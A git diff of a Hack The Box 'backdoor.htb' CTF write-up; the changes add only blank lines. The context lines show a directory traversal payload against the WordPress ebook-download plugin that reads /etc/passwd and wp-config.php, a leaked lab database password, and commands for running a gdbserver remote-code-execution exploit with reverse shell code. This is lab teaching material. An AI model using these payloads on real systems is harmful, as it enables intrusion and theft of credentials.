@@ -48,6 +48,7 @@ backdoor.htb
 3. /wp-admin
 
 ![](./IMG/2.png)
+
 ### Browse the path
 
 >  Browse to /wp-admin will direct to /wp-login
@@ -63,6 +64,7 @@ backdoor.htb
 > Browse to /wp-content/, it should include a plugin directory (/wp-content/plugins), I just check it and found '**ebookdownload**' plugin. 
 
 ![](./IMG/5.png)
+
 ## Exploitation
 
 ### WordPress Vulnerability 
@@ -75,6 +77,7 @@ backdoor.htb
 - [WordPress Vulnerability Database](https://patchstack.com/database/vulnerability/wordpress)
 
 ![](./IMG/6.png)
+
 ### Plugin Vulnerability
 
     I find a Directory Traversal Vulnerability for ebookdownload.
@@ -101,6 +104,7 @@ backdoor.htb
 ```
 # /wp-content/plugins/ebook-download/filedownloads?ebookdownloadurl=../../../../../../etc/passwd
 ```
+
 ![](./IMG/8.png)
 
 2. Read /wp-config.php
@@ -115,6 +119,7 @@ http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdown
 > DB_PASSWORD : MQYBJSaD#DxG6qbm
 
 ![](./IMG/10.png)
+
 ### LFI to RCE 
 
 > But those file seems doesn't have too many help for now.
@@ -192,6 +197,7 @@ for x in range(0, 1000):
 > First, find the cve for gdbserver
 
 ![](./IMG/13.png)
+
 - [Exploit DB - GNU gdbServer 9.2](exploit-db.com/exploits/50539)
 - Payload
 ```
@@ -328,6 +334,7 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 ```
 
 ![](./IMG/14.png)
+
 > Execute it...
 ```
 # python3 gdbserver_rce.py <victim ip> <reverse shell code>
@@ -345,6 +352,7 @@ $ python3 {sys.argv[0]} 10.10.10.200:1337 rev.bin
 ```
 
 ![](./IMG/17.png)
+
 ### Get user flag
 
 ```
@@ -448,6 +456,7 @@ Attach to a not detached screen session. (Multi display mode).
 
 >  If we just attach screen directly, it will error.
 
+
 ![](./IMG/24.png)
 
 > Here are some solution 
@@ -460,6 +469,7 @@ Attach to a not detached screen session. (Multi display mode).
 >I think the 'vt100' is a terminal name, so I also can change to 'xterm' and other teraminal
 
 ![](./IMG/27.png)
+
 ### Get root flag
 
 ```
